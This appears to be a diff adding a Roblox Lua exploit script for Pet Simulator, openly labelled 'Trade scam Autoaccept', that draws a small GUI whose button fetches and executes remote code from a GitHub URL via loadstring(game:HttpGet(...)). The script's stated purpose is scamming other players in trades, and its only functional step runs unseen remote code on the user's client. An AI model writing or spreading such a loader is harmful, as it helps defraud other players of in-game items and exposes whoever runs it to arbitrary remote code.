@@ -1,0 +1,49 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextButton = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(102, 14, 255)
+Frame.Position = UDim2.new(0.0317460299, 0, 0.450072348, 0)
+Frame.Size = UDim2.new(0, 331, 0, 295)
+Frame.Active = true
+Frame.Draggable = true
+
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(116, 92, 255)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.195645213, 0, 0.480330706, 0)
+TextButton.Size = UDim2.new(0, 200, 0, 50)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "AutoAccept (SPAM WHILE TRADE)"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 17.000
+TextButton.TextWrapped = true
+TextButton.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Jack92738/PetSimScamTradeScriptSource/main/Private", true))() 
+end)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(139, 116, 255)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(-0.00450774282, 0, -0.000775098801, 0)
+TextLabel.Size = UDim2.new(0, 332, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Trade scam Autoaccept **PRIVATE**"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
